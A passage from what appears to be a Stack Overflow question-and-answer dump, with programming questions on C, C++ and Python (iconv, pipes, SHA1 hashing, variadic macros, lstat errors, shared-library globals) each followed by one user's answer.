char outbuf[&lt;size-of-inbuf&gt;*4+1];

size_t inlen  = &lt;size-of-inbuf&gt;;
size_t outlen = &lt;size-of-inbuf&gt;*4+1;

char* c_inbuf  = (char*) inbuf;
char* c_outbuf = outbuf;

int ret = iconv(cd, &amp;c_inbuf, &amp;inlen, &amp;c_outbuf, &amp;outlen);
// more error checking here
</code></pre>

<p>iconv always returns -1 and the errno is set to EINVAL. I've verified that <code>&lt;size-of-len&gt;</code> is set correctly. I've got no clue why this code's failing now.</p>

<p><strong>Edit 2:</strong></p>

<p>iconv was failing because I was not setting the input buffer length right. Also, Mac doesn't seem to support the ""WCHAR_T"" encoding so I've changed it to UTF-16. Now I've corrected the length and changed the from encoding but iconv just returns without converting any character. It just returns 0.</p>

<p>To debug this issue, I even changed the input string to a temp string and set the input length appropriately. Even this iconv call just returns 0. My code now looks like:</p>

<pre><code>iconv_t cd = iconv_open(""UTF-8"", ""UTF-16"");
// error checking here

wchar_t* inbuf = ...; // get wchar_t* here - guaranteed to be UTF-16
char outbuf[&lt;size-of-inbuf&gt;*4+1];

size_t inlen  = &lt;size-of-inbuf&gt;;
size_t outlen = &lt;size-of-inbuf&gt;*4+1;

char* c_inbuf  = ""abc""; // (char*) inbuf;
inlen = 4;
char* c_outbuf = outbuf;

int ret = iconv(cd, &amp;c_inbuf, &amp;inlen, &amp;c_outbuf, &amp;outlen);
// more error checking here
</code></pre>

<p>I've confirmed that the converter descriptor is being opened correctly. The from-encoding is correct. The input buffer contains a few simple characters. Everything is hardcoded and still, iconv doesn't convert any characters and just returns 0 and outbuf remains empty.</p>

<p><em>Sanity loss alert!</em> </p>
","9530","","<p>Mac OS X uses UTF-8, so you need to convert the wide-character strings into UTF-8.  You can do this using <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man3/wcstombs.3.html"" rel=""nofollow""><code>wcstombs</code></a>, provided you first switch into a UTF-8 locale.  For example:</p>

<pre><code>// Do this once at program startup
setlocale(LC_ALL, ""en_US.UTF-8"");
...
// Error checking omitted for expository purposes
wchar_t *wideFilename = ...;  // This comes from wherever
char filename[256];  // Make sure this buffer is big enough!
wcstombs(filename, wideFilename, sizeof(filename));
// Construct popen command using the UTF-8 filename
</code></pre>

<p>You can also use <a href=""http://www.gnu.org/software/libiconv/"" rel=""nofollow"">libiconv</a> to do the UTF-16 to UTF-8 conversion for you if you don't want to change your program's locale setting; you could also roll your own implementation, as doing the conversion is not all that complicated.</p>
"
"<p>I'm writing a wrapper that forks an <code>execv()</code> process.  Output from the child is captured in <code>stderr</code>.  When <code>waitpid()</code> releases, I can read the contents of <code>stderr</code> and report it back.  </p>

<p>In my case, I want to dynamically allocate a buffer and write <code>stderr</code> into this buffer.  </p>

<p>To size the buffer I can <code>realloc()</code>, but this is not very efficient and I have found it tends to bloat memory pool use.  Rather, I'd like to know the size without altering its pointer.</p>

<p>Consider the following, and note that <code>MyStderr</code> is just a placeholder for <code>stderr</code>:</p>

<pre><code>int size=0;
int ch=0;
// int MyStderr is the stderr fd
FILE *nCountFD = fdopen(MyStderr, ""r"");
while ((ch = getc(nCountFD)!=EOF)
{
    ++size;
}
printf(""Size is %ld\n"", size);
</code></pre>

<p>Here I get the size.  However, now the file pointer for <code>MyStderr</code> is at the end of its buffer.  </p>

<p>I tried using <code>lseek</code>.</p>

<p><code>lseek()</code> fails against <code>stderr</code>, so I can't use it here.  At least, this is what my testing and stackoverflow searching indicates.</p>

<p>So ...</p>

<ol>
<li>Is there a way to get the size without moving <code>MyStderr</code> to eof ?</li>
</ol>

<p>or </p>

<ol>
<li>Is there an <code>lseek</code> method that will work with <code>MyStderr</code> ?</li>
</ol>

<p>Note.  Here is the only solution I can think of, using <code>realloc</code>..</p>

<pre><code>char *buf=(char*)malloc(80);
char *NewBuf=NULL;
int n=80;
while ((ch = getc(nCountFD)!=EOF)
{
    buf[i]=ch;
    ++size;
    if (size&gt;n)
    {
       n=n+80;
       NewBuf= realloc(buf, n);
       // some code to make sure it works here //
       buf=NewBuf;
    }
}
printf(""Size is %ld\n"", size);
</code></pre>

<hr>

<h2>And now the update</h2>

<p>Rather than build the functionality to work around the fact that stderr is unbuffered, I determined to make the initial malloc of my result buffer sufficiently large so that realloc() would be unlikely in the majority of cases.  And if realloc() happens, the original allocation is doubled in size for each realloc() as suggested.  </p>

<p>In testing (100000 iterations) this works very well with no leaking or discernible bloating.</p>

<p>I owe a great deal to the Stack Overflow community.  Thank you all.</p>

<p>The code below won't run stand-alone.  It's placed here to illustrate what I did.</p>

<p>.. 
after all the code that parses the commandline, forks, does execv, and cleans up...</p>

<pre><code>while (waitpid(nPID, &amp;status, 0) != nPID)
    ;
i = 0;
nFD = fdopen(nErrFD, ""r"");
if (!nFD) {
    snprintf(cErrMsg, 80, ""Cannot open fd[%i].  Failed to spaw process"",
            nErrFD);
    cbuf = strcpy(cbuf, cErrMsg);
    goto NECerror;
}

close(nErrFD);


cbuf = calloc(nBufSz, sizeof(char));
memset(cbuf, 0x00, nBufSz);
i = 0;
while ((ch = getc(nFD)) != EOF) {
    cbuf[i] = (char) ch;
    ++size;
    ++i;
    if (size &gt; nBufSz) {
        nBufSz = nBufSz + nBaseBufSz;
        NewBuf = realloc(cbuf, nBufSz);
        if (NewBuf == NULL) {
            snprintf(cErrMsg, 80,
                    ""Internal error:cannot allocate [%i] bytes"", nBufSz);
            cbuf = strcpy(cbuf, cErrMsg);
            fclose(nFD);
            goto NECerror;
        }
        cbuf = NewBuf;
        free(NewBuf);
    }

}
fclose(nFD);
</code></pre>
","9530","","<p>Pipes are not seekable -- if you're reading data from a pipe that's being provided by the other process, then you cannot seek its data stream.  You have to store the data as its read.</p>

<p>The reason you're probably seeing lots of memory thrashing is due to the way your expanding your buffer -- you only expand it by a constant amount every time it's exceeded.  You'll have much better success if you <em>double</em> its size when it's exceeded: this is a well-known technique for <a href=""http://en.wikipedia.org/wiki/Dynamic_array"" rel=""nofollow"">dynamic arrays</a>.</p>

<p>For example:</p>

<pre><code>// Error checking omitted for expository purposes
size_t size = 4096;
char *buf = malloc(size);
char *bufPtr = buf;
ssize_t n;
while((n = read(MyStderr, bufPtr, 4096) &gt; 0)
{
    bufPtr += n;

    // Make sure we always have at least 4096 bytes of free space in the
    // buffer for the next read
    if(size - (bufPtr - buf) &lt; 4096)
    {
        size *= 2;  // Watch out for overflow!
        buf = realloc(buf, size);
    }
}

// The (bufPtr - buf) bytes of buf now hold the entirety of the process's stderr
</code></pre>
"
"<p>I am trying to write a C program that proves SHA1 is nearly collision free, but I cannot figure out how to actually create the hash for my input values.  I just need to create the hash, and store the hex value into an array.  After some Google searches, I've found OpenSSL documentation directing me to use this:</p>

<pre><code> #include &lt;openssl/sha.h&gt;

 unsigned char *SHA1(const unsigned char *d, unsigned long n,
                  unsigned char *md);

 int SHA1_Init(SHA_CTX *c);
 int SHA1_Update(SHA_CTX *c, const void *data,
                  unsigned long len);
 int SHA1_Final(unsigned char *md, SHA_CTX *c);
</code></pre>

<p>I believe I should be using either unsigned char *SHA1 or SHA1_Init, but I am not sure what the arguments would be, given x is my input to be hashed.  Would someone please clear this up for me?  Thanks.</p>
","9530","","<p>If you have all of your data at once, just use the <code>SHA1</code> function:</p>

<pre><code>// The data to be hashed
char data[] = ""Hello, world!"";
size_t length = sizeof(data);

unsigned char hash[SHA_DIGEST_LENGTH];
SHA1(data, length, hash);
// hash now contains the 20-byte SHA-1 hash
</code></pre>

<p>If, on the other hand, you only get your data one piece at a time and you want to compute the hash as you receive that data, then use the other functions:</p>

<pre><code>// Error checking omitted for expository purposes

// Object to hold the current state of the hash
SHA_CTX ctx;
SHA1_Init(&amp;ctx);

// Hash each piece of data as it comes in:
SHA1_Update(&amp;ctx, ""Hello, "", 7);
...
SHA1_Update(&amp;ctx, ""world!"", 6);
// etc.
...
// When you're done with the data, finalize it:
unsigned char hash[SHA_DIGEST_LENGTH];
SHA1_Final(hash, &amp;ctx);
</code></pre>
"
"<p>In bash when I run a command like <code>wc &amp;</code> or <code>cat &amp;</code> that wants standard in right away, it returns immediately with</p>

<p>[1]+ Stopped cat</p>

<p>How is this accomplished? How do I stop a program that I started with exec, and how do I know to stop these programs in the first place? Is there some way to tell that these programs want stdin?</p>

<p>Thanks!</p>

<p>PS also, what is the + about? I've always wondered, but that's really hard to google...</p>
","9530","","<p>[Edited -- see other answers for the answer to the main question]</p>

<p>The <code>+</code> sign simply refers to the current <em>job</em>.  Each pipeline of commands (such as <code>foo | bar | baz</code>) is a job, which can be referred to using a <em>jobspec</em> beginning with the <code>%</code> character.  <code>%1</code> is job number 1, <code>%+</code> is the current job, and <code>%-</code> is the previous job.</p>

<p>For more information about jobs, see the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Job-Control"" rel=""nofollow"">Job Control section</a> of the Bash manual.</p>
"
"<p>I am writing a wrapper to automate some android ADB shell commands via Python (2.7.2). 
Since, in some cases, I need to run the command asynchronously, I am using the <a href=""http://docs.python.org/library/subprocess.html"" rel=""nofollow"">subprocess</a>.Popen method to issue shell commands.</p>

<p>I have run into a problem with the formatting of the <code>[command, args]</code> parameter of the <code>Popen</code> method, where there require command/args split is different between Windows and Linux:</p>

<pre><code># sample command with parameters
cmd = 'adb -s &lt;serialnumber&gt; shell ls /system'

# Windows:
s = subprocess.Popen(cmd.split(), shell=False) # command is split into args by spaces

# Linux:
s = subprocess.Popen([cmd], shell=False) # command is a list of length 1 containing whole command as single string
</code></pre>

<p>I have tried using <a href=""http://docs.python.org/library/shlex.html"" rel=""nofollow"">shlex</a>.split(), with and with out the posix flag:</p>

<pre><code># Windows
posix = False
print shlex.split(cmd, posix = posix), posix
# Linux
posix = True
print shlex.split(cmd, posix = posix), posix
</code></pre>

<p>Both cases return the same split.</p>

<p>Is there a method in <code>subprocess</code> or <code>shlex</code> that handles the OS-specific formats <em>correctly</em>?</p>

<p><strong>This is my current solution:</strong></p>

<pre><code>import os
import tempfile
import subprocess
import shlex

# determine OS type
posix = False
if os.name == 'posix':
    posix = True

cmd = 'adb -s &lt;serialnumber&gt; shell ls /system'
if posix: # posix case, single command string including arguments
    args = [cmd]
else: # windows case, split arguments by spaces
    args = shlex.split(cmd)

# capture output to a temp file
o = tempfile.TemporaryFile()
s = subprocess.Popen(args, shell=False, stdout=o, stderr=o)
s.communicate()
o.seek(0)
o.read()
o.close()
</code></pre>

<p>I don't think <code>shlex.split()</code> is doing anything here, and <code>cmd.split()</code> achieves identical results.</p>
","9530","","<p>The <code>shell=True</code> argument tells it to have the command line evaluated by your shell, which on Windows will be <code>Cmd.exe</code>; on Linux, it'll likely be <code>/bin/bash</code>, but could also be some other related shell (zsh, tcsh, etc.).  The difference in behavior is likely being caused by the shells interpreting the commands differently.</p>

<p>I'd strongly recommend <em>not</em> using <code>shell=True</code> if you can avoid it.  Just something like this:</p>

<pre><code>cmd = 'adb -s &lt;serialnumber&gt; shell ls /system'
s = subprocess.Popen(cmd.split())  # shell=False by default
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/5671312/why-does-vs2010-give-syntax-errors-when-syntax-is-correct"">Why does VS2010 give syntax errors when syntax is correct?</a>  </p>
</blockquote>



<p>I'm trying to develop a kind of Windows 32 service in C language, using Visual Studio 2010.</p>

<p>I created a new project, and inserted .c files :</p>

<ul>
<li>main.c</li>
<li>service.c</li>
<li>misc.c</li>
</ul>

<p>I also have two header files :</p>

<ul>
<li>myerrors.h</li>
<li>my.h</li>
</ul>

<p>Here's the code I have (be aware that it's just a draft).</p>

<p>main.c :</p>

<pre><code>#include &lt;Windows.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include ""stdafx.h""
#include ""my.h""
#include ""myerrors.h""

static int parse_args(int ac, char **av)
{
    int i = 0;

    while (++i &lt; ac)
        if (strcmp(av[i], ""-i"") &amp;&amp; !InstallMyService())
            return false;
        else if (strcmp(av[i], ""-d"") &amp;&amp; !UninstallMyService())
            return false;
        else if (strcmp(av[i], ""-p""))
            if (!av[i + 1])
                return false;
            else
            {
                if (!InsertPathInRegistry(av[i + 1]))
                    return false;
                i++;
            }
        else
            return false;
    return true;
}

int main(int ac, char **av)
{
    HANDLE hLogFile;

    if ((hLogFile = CreateFile(LOG_FILE_PATH, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        aff_error(CANT_CREATE_FILE);    
    if (ac &gt; 1)
    {
        if (!parse_args(ac, av))
        {
            aff_error(BAD_ARGUMENTS);
            return EXIT_FAILURE;
        }
    }
    else
    {
        SERVICE_TABLE_ENTRY DispatchTable[] = {{DC_SERVICE_NAME, ServiceMain}, {NULL, NULL}};
        StartServiceCtrlDispatcher(DispatchTable);
    }
    getchar();
    if (!CloseHandle(hLogFile))
        aff_error(CLOSE_FILE_FAILED);
    return EXIT_SUCCESS;
}
</code></pre>

<p>misc.c :</p>

<pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include ""my.h""
#include ""myerrors.h""

void aff_error(char *error_str)
{
    fprintf(stderr, ""ERROR: %s\n"", error_str);
}

bool InsertPathInRegistry(char *path)
{
    printf(""LOG: Inserting %s as "", path);
}

void WriteInLogFile(HANDLE hLogFile, char *log_string)
{
    printf(""WriteInLogFile function"");
}
</code></pre>

<p>service.c :</p>

<pre><code>#include &lt;Windows.h&gt;
#include ""my.h""

bool InstallMyService()
{
    return true;
}

bool UninstallMyService()
{
    return true;
}

void WINAPI ServiceCtrlHandler(DWORD Opcode)
{

}

void WINAPI ServiceMain(DWORD ac, LPTSTR *av)
{

}
</code></pre>

<p>My headers are just some function declarations and macros such as :</p>

<pre><code># define DC_SERVICE_NAME    ""MyService""

/* MISC functions */

void aff_error(char *error_str);
</code></pre>

<p>my.h</p>

<pre><code>#ifndef _MY_H_
# define _MY_H_

#include &lt;Windows.h&gt;
#include &lt;strsafe.h&gt;

/* Macros */

# define LOG_FILE_PATH      ""c:\\my_log_file.txt""
# define DC_SERVICE_NAME    ""MyService""

/* MISC functions */

void aff_error(char *error_str);

/* SERVICE functions */

void WINAPI ServiceMain(DWORD ac, LPTSTR *av);
bool InstallMyService();
bool UninstallMyService();
bool InsertPathInRegistry(char *path);
void WINAPI ServiceCtrlHandler(DWORD Opcode);

#endif /*!MY_H_ */
</code></pre>

<p>While trying to compile the project, i got some weird errors :</p>

<pre class=""lang-none prettyprint-override""><code>my.h(19): error C2061: syntax error : identifier 'InstallMyService'
my.h(19): error C2059: syntax error : ';'
my.h(19): error C2059: syntax error : ')'
</code></pre>

<p>Or :</p>

<pre class=""lang-none prettyprint-override""><code>my.h(21): error C2061: syntax error : identifier 'InsertPathInRegistry'
my.h(21): error C2059: syntax error : ';'
my.h(21): error C2059: syntax error : 'type'
</code></pre>

<p>I checked on some forums that says those errors are commonly errors with includes badly placed, but I don't really know in this case, I don't think I made mistakes with includes...</p>

<p>Can anyone illuminate me ?</p>

<p>Thanks.</p>
","9530","","<p><code>bool</code> is not a data type in ANSI C.  It is a data type in the C99 version of the language, <em>only if <code>&lt;stdbool.h&gt;</code> is included</em>, but Visual Studio does not support C99, only C89 (C99 also adds the <code>_Bool</code> data type, which can be used without including any headers).</p>

<p>I suggest you replace <code>bool</code> with another type such as <code>int</code>, or use a <code>typedef</code> to alias it with <code>int</code> or <code>unsigned char</code> or something.</p>
"
"<p>I have a C file that needs a specific header file. If that header file does not exist, I want the preprocessor to issue a specific warning. Something like</p>

<pre><code>#if !(#include &lt;special.h&gt;)
#warning ""Don't worry, you can fix this.""
#warning ""You just need to update this other repo over here:""
#endif
</code></pre>

<p>Is this possible with the C preprocessor?</p>
","9530","","<p>No, this is not possible.  All you can do is try to <code>#include</code> the header, and if it doesn't exist, the compiler will give you an error.</p>

<p>An alternative would be to use a tool like <a href=""http://www.gnu.org/software/autoconf/"">GNU autoconf</a>.  autoconf generates a shell script called <code>configure</code> which analyzes your build system and determines things like whether or not you have certain header files installed, and it generates a header file consisting of macros indicating that information.</p>

<p>For example, it might define <code>HAVE_SYS_TIME_H</code> if your build system includes the header <code>&lt;sys/time.h&gt;</code>, so you can then write code such as:</p>

<pre><code>#if HAVE_SYS_TIME_H
#include &lt;sys/time.h&gt;
#else
#warning ""Don't worry, you can fix this.""
#endif
</code></pre>
"
"<p>Here is my code:</p>

<pre><code>#include &lt;cstdlib&gt;
#include &lt;iostream&gt;
#include &lt;cstring&gt;

using namespace std;

int main(int argc, char *argv[])
{
    int duze[26];
    int male[26];
    int n;
    //cout&lt;&lt;int('a')&lt;&lt;endl&lt;&lt;int('A');
    cin&gt;&gt;n;

    char temp;
    for (int i=0; i&lt;27; i++)
        male[i]=0;
    for (int i=0; i&lt;27; i++)
        duze[i]=0;

    while (n&gt;=0)
    {
        cin.get(temp);
        if (temp=='\n') { n--; continue;}
        if (temp==' ') continue;
        if (temp&gt;='a' &amp;&amp; temp&lt;='z')
            male[temp-'a']++;
        else if (temp&gt;='A' &amp;&amp; temp&lt;='Z')
            duze[temp-'A']++;
    }

    for (int i=0; i&lt;27; i++)
        if (male[i]&gt;0) cout&lt;&lt;char(i+'a')&lt;&lt;"" ""&lt;&lt;male[i]&lt;&lt;endl;
    for (int i=0; i&lt;27; i++)
        if (duze[i]&gt;0) cout&lt;&lt;char(i+'A')&lt;&lt;"" ""&lt;&lt;duze[i]&lt;&lt;endl;
    //system(""pause"");
    return 0;
}
</code></pre>

<p>The program counts letters in given n lines of text. The letters that dont exist are skipped.
When I run it in console it looks ok, but I know that there are EOF characters before characters...
How can I avoid it?</p>
","9530","","<p>You have a <a href=""http://en.wikipedia.org/wiki/Buffer_overflow"" rel=""nofollow"">buffer overflow</a> (several of them, actually).  You declare two arrays of size 26 (<code>duze</code> and <code>male</code>), but then you proceed to write data into 27 indices (0 through 26).</p>

<p>Since this is outside the bounds of the buffer, you're stomping on other memory, which causes erratic, unpredictable behavior.  The C++ standard calls this <strong>undefined behavior</strong>: once you do this, absolutely anything could happen: your program could crash, it could have subtle errors like this, it could appear to work correctly, or it could even erase your hard drive (though that's rather unlikely).</p>

<p>To fix this, change all of your 27's into 26's; you could also increase the array size to 27, but then printing out <code>char(26+'a')</code> would give you <code>{</code>, which is probably not your intent.</p>
"
"<p>I'm looking to write what I would imagine is a fairly common macro. I want to emulate the repeated ""-v"" options on many POSIX programs by defining a bunch of macros of the following form:</p>

<pre><code>#define V1(str, ...) if(optv &gt;= 1){printf(""%s: ""str,prog,__VA_ARGS__);}

int main(int argc, char* argv[])
{
  // ... stuff ...
  int i = 1;
  V1(""This contains a variable: %d\n"",i);
}

// Output:
// ./program: This contains a variable: 1
</code></pre>

<p>where <code>optv</code> counts the number of ""-v"" options found on the command line and <code>prog</code> contains the program name (neither shown). This works well, but the problem is that I <em>have</em> to use a variable. <code>V1(""Output"")</code> will generate a compiler error. I could always use <code>V1(""Output%s"","""")</code> but there should be a cleaner solution.</p>
","9530","","<p>The GNU C preprocessor has a <a href=""http://gcc.gnu.org/onlinedocs/cpp/Variadic-Macros.html"" rel=""nofollow"">special feature</a> that lets you delete the trailing comma when there are no arguments filling the variadic portion by prepending the token-pasting operator <code>##</code> to <code>__VA_ARGS__</code>:</p>

<pre><code>#define V1(str, ...) if(optv &lt; 1); else printf(""%s: ""str,prog, ## __VA_ARGS__)
</code></pre>

<p>Alternatively, if you wish to remain fully C99 compliant, you could incorporate the the format string parameter into the ellipsis, but in this instance you'll also need to refactor your code since you want to include the extra <code>prog</code> parameter between the format string and the varargs.  Something like this might work:</p>

<pre><code>#define V1(...) if(optv &lt; 1); else myprintf(prog, __VA_ARGS__)
int myprintf(const char *prog, const char *fmt, ...)
{
    // Print out the program name, then forward the rest onto printf
    printf(""%s: "", prog);

    va_list ap;
    va_start(ap, fmt);
    int ret = vprintf(fmt, ap);
    va_end(ap);

    return ret;
}
</code></pre>

<p>Then, <code>V1(""Output"")</code> expands to <code>myprintf(prog, ""Output"")</code> without using any non-C99 compiler extensions.</p>

<p><strong>EDIT</strong></p>

<p>Also note that I inverted the <code>if</code> condition in the macro, due to some weird issues that can arise if you invoke the macro inside an <code>if</code> statement without braces—see <a href=""http://www.parashift.com/c++-faq-lite/misc-technical-issues.html#faq-39.4"" rel=""nofollow"">this FAQ</a> for a detailed explanation.</p>
"
"<p>Is it possible to make a program auto run (execute) when the USB it is stored on is plugged into a computer</p>

<p>I don't think this is possible due to the searching I have looked at on the Internet and also the security risk such coding would have</p>

<p>E.g. I have a simple countdown timer (10 to 1) programmed in C++ (complied on windows), when the USB (which the .exe file is stored on) is plugged into a computer the timer will start without me executing it manually.</p>
","9530","","<p>By default it's not possible, since Windows puts users in control of their computers as much as possible—if they don't want autorun enabled, it will not be possible to have a program executed automatically.</p>

<p>You could write a helper program that runs in the background (possibly as a service) that sleeps most of the time, waiting for a USB device to be plugged in.  There might be a way to receive notifications of this, or you might just have to poll it periodically, I don't know.  Once it detects a USB device, it can then of course do whatever it wants (<code>CreateProcess</code> etc.).</p>
"
"<p>When I run this code through several entries of a directory, it usually returns 0, but in two directories (one Windows one in Unix) I keep getting a ""Bad Address"" error message.  lstat and relative_path are not null and relative_path does point to a valid directory. This code worked on other directories.  The directories don't have any RWX restrictions.  Prior to this I was able to call opendir and readdir without getting errors or NULL responses on these problem directories.  Valgrind shows no memory leaks or other errors.</p>

<pre><code>struct stat *this_lstat; 
...
DIR *dir = opendir(path); 
...
dptr = readdir(dir);
...
</code></pre>

<p>Note:     relative_path == ""./bin/Debug"" at this point.</p>

<pre><code>int return_code = lstat(relative_path, this_lstat);

if (return_code &lt; 0) {
        fprintf(stderr, ""find: "");
        perror(dptr-&gt;d_name); //printf(""3""); //Error reading the file or directory
        return NULL;
}
</code></pre>

<p>UPDATE:  I added checks on malloc and realloc and now I get segmentation error on the lstat line itself.  The error handling code is not called. Here is the stacktrace:
Program received signal SIGSEGV, Segmentation fault.</p>

<pre><code>0xb76f2779 in ?? () from /lib/tls/i686/cmov/libc.so.6 
(gdb) backtrace
#0  0xb76f2779 in ?? () from /lib/tls/i686/cmov/libc.so.6
#1  0xb76ead47 in __lxstat () from /lib/tls/i686/cmov/libc.so.6
#2  0x0804959c in lstat ()
#3  0x0804903c in walk_directory_tree (path=0x805b058 ""./testmine"",
   findme=0x0, type_str=0x0, base_dir_searched=1, dirs_later_array=0x805b0d0)
   at pfind.c:266
#4  0x08049106 in walk_directory_tree (path=0xbfa5cca3 ""."", findme=0x0,
   type_str=0x0, base_dir_searched=1, dirs_later_array=0x804b018)
   at pfind.c:282
#5  0x08048c2a in main (ac=2, av=0xbfa5c8a4) at pfind.c:143
</code></pre>
","9530","","<p>From what I can tell, the error is being caused by your failure to initialize the <code>this_lstat</code> that gets passed as the second parameter to <code>lstat</code>.</p>

<p>The error string ""Bad address"" corresponds to the error code <code>EFAULT</code>, which comes from passing an invalid pointer to a system call.  So, either the path name being passed to <code>lstat</code> doesn't point to a valid null-terminated string in readable memory, or the <code>struct stat</code> being passed as the second parameter doesn't point to valid writable memory.</p>

<p>You seem to be passing an unitialized pointer, which is almost certainly pointing to invalid memory.  Valgrind doesn't complain because up until the system call, you haven't done anything wrong—only when the kernel tries to access the memory does it realize its invalid.</p>

<p>To fix this, either allocate memory for the <code>struct stat</code> with <code>malloc</code>, or just pass a pointer to a variable on the stack instead of using a pointer:</p>

<pre><code>struct stat this_lstat;
lstat(..., &amp;this_lstat);
</code></pre>
"
"<p>For an iPhone app, should I #include or #import , and why?</p>

<p>I've seen it done both ways, e.g., <a href=""http://www.codecollector.net/view/2F26056B-EC5A-4FC3-8886-9C7C39DFF07F"" rel=""nofollow"">#import</a> &amp; <a href=""http://cocoasamurai.blogspot.com/2010/01/understanding-objective-c-runtime.html"" rel=""nofollow"">#include</a>.</p>
","9530","","<p>If the header file has traditional <a href=""http://en.wikipedia.org/wiki/Include_guard"">include guards</a>, it really doesn't matter which you use, it's more of a stylistic choice.  There might be a <em>tiny</em> performance boost if you use <code>#import</code> instead of <code>#include</code>, but I doubt it will be noticeable, since most compilers these days are smart enough to recognize include guards and optimize accordingly.</p>

<p>If, on the other hand, the header file does <strong>not</strong> have include guards, then you should always use <code>#import</code>, since <code>#import</code> will ensure that the header will only get included once -- if you accidentally <code>#include</code> such a header twice, you will almost certainly get a deluge of compiler errors about redefinitions etc.</p>

<p>Since most Objective-C headers (especially those coming from the Objective-C runtime or the Cocoa headers) do not have include guards, you should use <code>#import</code> when including those.  When including standard C library headers or headers from a third-party library, it doesn't matter which you choose -- pick one style and be consistent.</p>
"
"<p>i started to play with Parallel Pattern Library in VS2010 the application gives me expected results but when i benchmark the debug version and release version i get strange execution time in Release version as follow 
Debug Version :
""Sequential Duration : 1014 ""
""Parallel Duration : 437 ""
Release Version 
""Sequential Duration : 31 ""
""Parallel Duration : 484 ""</p>

<p>this is my application code </p>

<pre><code>double DoWork(int workload)
{
    double result=0;
    for(int i =0 ; i &lt; workload;i++)
    {
        result +=sqrt((double)i * 4*3) + i* i;
    }
    return result;
}

vector&lt;double&gt; Seqential()
{
    vector&lt;double&gt; results(100);
    for(int i = 0 ; i &lt;100 ; i++)
    {
        results[i] = DoWork(1000000);
    }

    return results;
}

vector&lt;double&gt; Parallel()
{
     vector&lt;double&gt; results(100);
     parallel_for(0,(int)100,1,[&amp;results](int i)
     {
         results[i] = DoWork(1000000);
     });

     return results;
}

double Sum(const vector&lt;double&gt;&amp; results)
{
    double result =0;
    for(int i = 0 ; i &lt; results.size();i++)
        result += results[i];
    return result;
}

int main()
{
    DWORD start = GetTickCount();
    vector&lt;double&gt; results = Seqential();
    DWORD duration = GetTickCount() - start;
    cout&lt;&lt;""Sequential Duration : ""&lt;&lt;duration &lt;&lt;""  Result : "" &lt;&lt;Sum(results) &lt;&lt; endl;

    start = GetTickCount();
    results = Parallel();
    duration = GetTickCount() - start;
    cout&lt;&lt;""Prallel Duration : ""&lt;&lt;duration &lt;&lt;""  Result : "" &lt;&lt;Sum(results) &lt;&lt; endl;
    system(""PAUSE"");
    return 0;
}
</code></pre>
","9530","","<p>What's likely happening is that the overhead of spawning multiple threads is taking more time than simply computing the results.  In a Release build, the compiler is able to do a lot of optimization, so the amount of work being done inside <code>DoWork</code> is considerably smaller compared to the amount of work it takes to set up a thread and tear it down.</p>

<p>If you make <code>DoWork</code> do much more work (such as by looping many times), you'll see results that match your expectations more closely.</p>
"
"<p>In C, declaring a variable <code>static</code> at the global level (outside any function) indicates that it is visible only to that linker object  (typically, that .C file).</p>

<p>If the same .C file is part of multiple different libraries that are then linked together in a single executable, do conflicts arise?</p>

<p>For example:</p>

<h2>MyFile.c</h2>

<pre><code>typedef struct {
   [my important data];
} MyGlobalType;

static MyGlobalType globalData = { [...data...] };
</code></pre>

<p>Then if I have:</p>

<p><strong>Plugin_Alpha.so</strong>: <em>composed of MyFile.C + AlphaSource.C</em><br>
<strong>Plugin_Beta.so</strong>: <em>composed of MyFile.C + BetaSource.C</em><br>
<strong>MainProgram.exe</strong>: <em>composed of MainCode.C (which loads the two plugins)</em></p>

<p>Will Plugin_Alpha and Plugin_Beta have separate, isolated copies of <code>globalData</code>?
Or will they end up referring to the same structure?</p>
","9530","","<p>Well, here's one way to find out:</p>

<p>File <code>liba.c</code>:</p>

<pre><code>static int globalData;

int *GetGlobalData() { return &amp;globalData; }
</code></pre>

<p>Compile into two separate shared libraries:</p>

<pre><code>$ gcc liba.c -o liba.so -fPIC -shared
$ gcc liba.c -o libb.so -fPIC -shared
</code></pre>

<p>Main program:</p>

<pre><code>#include &lt;dlfcn.h&gt;
#include &lt;stdio.h&gt;

int main(void)
{
  // Error checking omitted for expository purposes

  void *liba = dlopen(""liba.so"", RTLD_LAZY);
  void *libb = dlopen(""libb.so"", RTLD_LAZY);

  typedef int* (*FuncV_IP)(void);
  FuncV_IP funca = (FuncV_IP)dlsym(liba, ""GetGlobalData"");
  FuncV_IP funcb = (FuncV_IP)dlsym(libb, ""GetGlobalData"");

  printf(""Module A: GetGlobalData() ==&gt; %p\n"", funca());
  printf(""Module B: GetGlobalData() ==&gt; %p\n"", funcb());

  dlclose(liba);
  dlclose(libb);

  return 0;
}
</code></pre>

<p>Compile and run it:</p>

<pre><code>$ gcc main.c -ldl
$ LD_LIBRARY_PATH=. ./a.out
</code></pre>

<p>Output:</p>

<pre><code>Module A: GetGlobalData() ==&gt; 0x7fa97536d020
Module B: GetGlobalData() ==&gt; 0x7fa97516b020
</code></pre>

<p>So therefore, each shared library gets its own copy of the global variables.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/4366600/sizeof-doesnt-return-the-true-size-of-variable-in-c"">Sizeof doesn&#39;t return the true size of variable in C</a><br>
  <a href=""http://stackoverflow.com/questions/4941142/c-sizeof-string-is-always-8"">C -&gt; sizeof string is always 8</a>  </p>
</blockquote>



<p>Sizeof prints out 6 for:</p>

<pre><code>printf(""%d\n"", sizeof(""abcde""));
</code></pre>

<p>But it prints out 4 for:</p>

<pre><code>char* str = ""abcde"";
printf(""%d\n"", sizeof(str));
</code></pre>

<p>Can someone explain why?</p>
","9530","","<p>The string literal <code>""abcde""</code> is a character <em>array</em>.  It is 6 bytes long, including the null terminator.</p>

<p>A variable of type <code>char*</code> is a <em>pointer</em> to a character.  Its size is the size of a pointer, which on 32-bit systems is 4 bytes.  <code>sizeof</code> is a compile time operation<sup>†</sup>, so it only looks at the variable's static type, which in this case is <code>char*</code>.  It has no idea what's being pointed to.</p>

<p>† Except in the case of variable-length arrays, a feature introduced in the C99 language standard</p>
"
"<p>I'm trying to send a message through ICMP packets but I don't know how to do it.</p>

